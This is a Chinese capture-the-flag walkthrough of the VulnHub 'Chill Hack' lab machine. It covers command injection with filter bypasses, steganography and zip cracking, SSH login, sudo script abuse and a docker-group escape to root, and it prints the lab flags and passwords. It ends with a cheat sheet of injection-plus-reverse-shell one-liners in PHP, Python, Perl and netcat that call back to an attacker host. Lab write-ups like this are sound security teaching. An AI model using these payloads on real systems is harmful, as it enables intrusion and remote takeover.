> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.lz80.com](https://www.lz80.com/21192.html)

> 作者：ch4nge 时间：2021.1.25 靶场信息： 地址：https://www.vulnhub.com/entry/chill-hack-1,622/ 发布日期：2020 年 12 月 9 日 难度：容…......

作者：ch4nge  
时间：2021.1.25

靶场信息：

> 地址：https://www.vulnhub.com/entry/chill-hack-1,622/  
> 发布日期：2020 年 12 月 9 日  
> 难度：容易 / 中级  
> 目标：获取标志 Flag: 2 (User and root)
> 
> 运行：VMware Workstation 16.x Pro（默认的 NAT 网络模式，VMware 比 VirtualBox 更好地工作）
> 
> hint ：枚举

前言
--

本次靶场使用 VMware Workstation 16.x Pro 进行搭建运行。将我的 kali 系统和靶机一样使用 NAT 网络模式。本次演练使用 kali 系统按照渗透测试的过程进行操作。在渗透的时候需要使用命令执行得到一个 A 用户 shell，通过一个图片信息得到 B 用户的 ssh 密码，并在 B 用户上找到了存在 sudo 缺陷的脚本得到 C 用户的 shell，并拿到 user-flag，而 B 用户在 docker 组，利用 docker 进行提权至 root。文章有不对的地方欢迎师傅指正~

一、信息搜集
------

### 1. 靶机 ip

使用 nmap 进行扫描，得到 ip 10.0.0.131

![](https://image.3001.net/images/20210124/1611487128_600d579890af9aa84f64b.png!small?1611487128830)

### 2. 开放端口 服务

![](https://image.3001.net/images/20210124/1611487206_600d57e604b724ae94666.png!small?1611487206190)

```
PORT          STATE          SERVICE              VERSION
21/tcp        open            ftp                      vsftpd 3.0.3
22/tcp        open            ssh                     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp        open            http                    Apache httpd 2.4.29 ((Ubuntu))
```

### 3. ftp 匿名访问

![](https://image.3001.net/images/20210124/1611487433_600d58c913a4f93142bc9.png!small?1611487433270)

下载文件，是一个提示

```
Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```

![](https://image.3001.net/images/20210124/1611487521_600d59215e679dddc8139.png!small?1611487521581)

### 4. 网站信息搜集

首页

![](https://image.3001.net/images/20210124/1611487674_600d59ba60c3903041f0f.png!small)

二、漏洞探测
------

### 1. 目录扫描

```
dirb http://10.0.0.131/
```

![](https://image.3001.net/images/20210124/1611488305_600d5c31df79f617b1530.png!small?1611488306174)

访问

```
http://10.0.0.131/secret/
```

![](https://image.3001.net/images/20210124/1611488385_600d5c81b235652be2ce7.png!small?1611488385979)

漏洞来的太快就像龙卷风~ 命令执行漏洞

三、漏洞利用
------

### 1. 命令执行漏洞利用

前面 ftp 里面拿到的提示说有字符串的过滤，想办法绕过

经过尝试发现可以使用管道符进行绕过

```
whoami|ls
```

![](https://image.3001.net/images/20210125/1611504256_600d9a8030559301d9740.png!small?1611504256259)

### 2. php 反弹 shell

```
whoami|php -r '$sock=fsockopen("10.0.0.129",8888);exec("/bin/bash -i <&3 >&3 2>&3");'
```

![](https://image.3001.net/images/20210125/1611504355_600d9ae37a2c0cc273981.png!small?1611504356043)

### 3. 信息搜集

在 / var/www/files 路径中发现 hacker.php

![](https://image.3001.net/images/20210125/1611504392_600d9b087954effd62720.png!small?1611504392694)

查看文件内容，得到提示

![](https://image.3001.net/images/20210125/1611504434_600d9b32218f620127eca.png!small?1611504434386)

在黑暗中看！你会找到答案的

继续寻找可用信息，在 / var/www/files/images 路径找到 hacker-with-laptop_23-2147985341.jpg

由于靶机是 CTF 模式，是有可能存在信息隐写的。看图片名字应该是有信息隐藏在图片里面了，使用 python httpserver 搭建服务，将文件下载到本地

发现使用 steghide 可以将信息提取出来，得到 backup.zip，解密需要密码

```
steghide extract -sf hacker-with-laptop_23-2147985341.jpg
```

![](https://image.3001.net/images/20210125/1611504500_600d9b74162e67160b4f2.png!small?1611504500316)

使用 fcrackzip 工具暴力破解 zip 密码，使用 kali 系统自带的 / usr/share/wordlists/rockyou.txt 字典

```
fcrackzip -D -u -p /usr/share/wordlists/rockyou.txt  backup.zip
```

![](https://image.3001.net/images/20210125/1611504622_600d9bee7d5d808153771.png!small?1611504622593)

得到密码 **pass1word**

解压得到 source_code.php

```
<html>
<head>
        Admin Portal
</head>
        <title> Site Under Development ... </title>
        <body>
                <form method="POST">
                        Username: <input type="text" ><br><br>
                        Email: <input type="email" ><br><br>
                        Password: <input type="password" >
                        <input type="submit" > 
                </form>
<?php
        if(isset($_POST['submit']))
        {
                $email = $_POST["email"];
                $password = $_POST["password"];
                if(base64_encode($password) == "IWQwbnRLbjB3bVlwQHNzdzByZA==")
                { 
                        $random = rand(1000,9999);?><br><br><br>
                        <form method="POST">
                                Enter the OTP: <input type="number" >
                                <input type="submit" >
                        </form>
                <?php   mail($email,"OTP for authentication",$random);
                        if(isset($_POST["submitOtp"]))
                                {
                                        $otp = $_POST["otp"];
                                        if($otp == $random)
                                        {
                                                echo "Welcome Anurodh!";
                                                header("Location: authenticated.php");
                                        }
                                        else
                                        {
                                                echo "Invalid OTP";
                                        }
                                }
                }
                else
                {
                        echo "Invalid Username or Password";
                }
        }
?>
</html>
```

根据文件内容可以判断出这是登录页面的程序，判断输入的密码是否正确，正确密码的 base64 编码是

```
IWQwbnRLbjB3bVlwQHNzdzByZA==
解密：
⚡ root@ch4nge  ~/file/VulnHub/Chill_Hack  echo -n "IWQwbnRLbjB3bVlwQHNzdzByZA==" |base64 -d
!d0ntKn0wmYp@ssw0rd#
```

密码：**!d0ntKn0wmYp@ssw0rd**

猜测密码是 ssh 用户的，查看 ssh 用户名 anurodh、apaar、aurick

![](https://image.3001.net/images/20210125/1611505224_600d9e48f31cd62513711.png!small?1611505225121)

分别使用 ssh 登录，在登录 anurodh 用户时成功

![](https://image.3001.net/images/20210125/1611504870_600d9ce6728159acf8fac.png!small?1611504870648)

在 / home/apaar 路径发现 local.txt 文件，没有读取权限。尝试获取 apaar 用户权限或者 root 权限进行读取

![](https://image.3001.net/images/20210125/1611505304_600d9e98a50c36a36865d.png!small?1611505304815)

### 4. 获取 apaar 用户权限

使用 sudo -l 查看可以以 sudo 的身份运行的命令

```
anurodh@ubuntu:~$ sudo -l
Matching Defaults entries for anurodh on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User anurodh may run the following commands on ubuntu:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
```

发现可以将 / home/apaar/.helpline.sh 作为 apaar 用户运行，且不需要输入密码

查看该文件，它会提示输入两次数据，然后将它们执行 / dev/null，且第二次输入的命令可以被执行

![](https://image.3001.net/images/20210125/1611505682_600da0129f07db173252b.png!small?1611505682763)

这里使用 apaar 用户运行文件，并在第二次信息输入 / bin/bash，以尝试获取 apaar 用户的 shell

![](https://image.3001.net/images/20210125/1611505840_600da0b0921111af2023d.png!small?1611505840745)

成功了！使用 python3 升级这个 shell

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![](https://image.3001.net/images/20210125/1611505889_600da0e13d1be93d126bc.png!small?1611505889382)

### 5. 得到第一个标志 USER-FLAG

```
{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}
```

### 6. 使用 LinEnum.sh 获取 apaar 和 anurodh 用户的信息

LinEnum.sh 是一个非常好用的脚本，有温馨提示，[LinEnum 脚本下载](https://www.lz80.com/go?_=2140ebf727aHR0cHM6Ly9naXRodWIuY29tL3JlYm9vdHVzZXIvTGluRW51bQ==)

在本地使用 python HTTPServer 搭建服务，在靶机的 shell 中下载 LinEnum 脚本

![](https://image.3001.net/images/20210125/1611506090_600da1aa8f4988daf5fd8.png!small?1611506090711)

运行脚本，得知当前用户（anurodh）在 docker 用户组（apaar 没有）

```
$ chmod +x LinEnum.sh
$ ./LinEnum.sh
```

![](https://image.3001.net/images/20210125/1611506269_600da25da147482bc11da.png!small?1611506269713)

四、权限提升
------

### 1. docker 提权

安利一个很好用的网站 https://gtfobins.github.io/

在 gtfobins 搜索 docker 获取相关信息，得到提权命令，获取 root 权限

```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

![](https://image.3001.net/images/20210125/1611506425_600da2f94942abfc6c39c.png!small?1611506425411)

升级交互式 shell

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### 2. 得到第二个标志 ROOT-FLAG

```
{ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}
```

![](https://image.3001.net/images/20210125/1611506447_600da30f383398b88bb39.png!small?1611506447371)

总结
--

靶机很友好，网站的命令执行漏洞探测很简单，这里补充一下在此次反弹 shell 的时候可以用到的方法

**使用管道符绕过过滤**

```
whoami|ls-->ls
whoami|ls /home-->ls /home
```

php

```
whoami|php -r '$sock=fsockopen("10.0.0.129",8888);exec("/bin/bash -i <&3 >&3 2>&3");'
```

python3

```
whoami|python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.129",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

perl

```
whoami|perl -e 'use Socket;$i="10.0.0.129";$p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

```
whoami|perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.0.0.129:5555");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

nc（netcat）

```
whoami|rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.129 5555 >/tmp/f
```

**使用双引号绕过过滤**

```
whoami""-->whoami
ls""-->ls
```

反弹 shell

```
rm"" /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.129 5555 >/tmp/f
```

**使用分号绕过过滤**

```
ls;whoami-->whoami
ls;ls-->ls
```

反弹 shell

```
ls;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.129 5555 >/tmp/f
```